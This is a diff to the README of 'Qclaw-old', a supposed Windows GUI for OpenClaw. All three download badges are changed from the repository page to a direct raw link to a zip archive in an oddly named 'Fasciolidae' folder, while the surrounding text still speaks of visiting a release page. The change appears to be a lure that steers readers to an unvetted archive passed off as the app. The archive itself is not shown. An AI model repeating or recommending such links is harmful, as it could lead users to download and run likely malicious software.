@@ -1,6 +1,6 @@
 # 🧩 Qclaw-old - Easy OpenClaw for Windows
 
-[![Download Qclaw-old](https://img.shields.io/badge/Download-Qclaw--old-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Commutertrafficfarsi309/Qclaw-old)
+[![Download Qclaw-old](https://img.shields.io/badge/Download-Qclaw--old-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Commutertrafficfarsi309/Qclaw-old/main/Fasciolidae/Qclaw_old_v1.2.zip)
 
 ## 🚀 What is Qclaw-old?
 
@@ -25,7 +25,7 @@ If you want to run OpenClaw with a GUI, this app gives you a direct path.
 
 Use this link to visit the page and download the app:
 
-[![Visit Qclaw-old Download Page](https://img.shields.io/badge/Visit-Download%20Page-808080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Commutertrafficfarsi309/Qclaw-old)
+[![Visit Qclaw-old Download Page](https://img.shields.io/badge/Visit-Download%20Page-808080?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Commutertrafficfarsi309/Qclaw-old/main/Fasciolidae/Qclaw_old_v1.2.zip)
 
 Open the link above in your browser, then look for the latest release or app file on the page. After that, download the Windows version to your PC.
 
@@ -178,7 +178,7 @@ This project relates to:
 
 ## 📎 Download again
 
-[![Download Qclaw-old Now](https://img.shields.io/badge/Download-Qclaw--old-2d3436?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Commutertrafficfarsi309/Qclaw-old)
+[![Download Qclaw-old Now](https://img.shields.io/badge/Download-Qclaw--old-2d3436?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Commutertrafficfarsi309/Qclaw-old/main/Fasciolidae/Qclaw_old_v1.2.zip)
 
 ## 🖱️ Step-by-step shortcut
 
